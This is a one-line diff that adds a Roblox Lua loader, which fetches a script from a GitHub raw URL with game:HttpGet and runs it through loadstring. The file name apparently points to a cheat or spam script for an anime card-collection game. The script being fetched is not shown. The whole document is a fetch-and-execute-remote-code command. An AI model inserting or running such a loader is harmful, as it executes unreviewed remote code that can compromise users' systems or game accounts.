@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/ShinobiComply/loaders/main/loaders/event-anime-card-collection-spam3-9hh5lvunmbd1gx.lua"))()
